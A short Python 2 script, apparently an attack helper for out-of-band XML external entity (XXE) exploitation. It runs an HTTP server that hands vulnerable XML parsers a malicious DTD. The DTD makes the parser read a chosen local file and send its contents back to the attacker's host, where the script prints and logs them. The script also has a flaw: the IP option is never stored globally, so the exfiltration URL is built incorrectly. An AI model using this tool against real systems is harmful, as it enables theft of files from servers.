#!/usr/bin/env python

import SimpleHTTPServer
import SocketServer
import logging
import sys, getopt
import re
from colorama import init, Fore, Back, Style
import urllib
init()

port = 80
file = ''
ip = ''

def main(argv):
    global file
    global port
    try:
        opts, args = getopt.getopt(argv,"hp:f:i:",["port=","file=","ip="])
    except getopt.GetoptError:
        print 'xxeserv.py -p <listeningPort> -f <file>'
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print 'xxeserv.py -p <listeningPort> -f <file>'
            sys.exit()
        elif opt in ("-p", "--port"):
            port = int(arg)
            print(Fore.YELLOW + 'Listening on port: ' + str(port))
            print(Style.RESET_ALL)
        elif opt in ("-i", "--ip"):
            ip = arg
            print(Fore.YELLOW + 'Listening on: ' + ip)
            print(Style.RESET_ALL)
        elif opt in ("-f", "--file"):
            file = arg
            print(Fore.YELLOW + 'Requesting file: ' + file)
            print(Style.RESET_ALL)
        else:
            print 'Incorrect options specified, use xxeserv.py -p <listeningPort> -f <file>'
            sys.exit()

if __name__ == "__main__":
       main(sys.argv[1:])

class GetHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    def do_GET(self):
        if '.dtd' in self.path: 
                self.send_response(200)
                self.send_header('Content-type','application/xml')
                self.end_headers()
                self.wfile.write('<!ENTITY % data SYSTEM "file:///' + file + '"><!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM \'http://' + ip + ':' + str(port) + '/?data=%data;\'>">')
                return
        elif '?data=' in self.path:
            print(Fore.GREEN + 'Receiving file: ' + file)
            print(urllib.unquote(self.path).decode('utf8'))
            print(Style.RESET_ALL)
            self.send_response(200)
            self.send_header('Content-type','application/xml')
            self.end_headers()
            logging.error(self.path)
            return
        SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
Handler = GetHandler
SocketServer.TCPServer.allow_reuse_address=True
httpd = SocketServer.TCPServer((ip, port), Handler)
httpd.serve_forever()

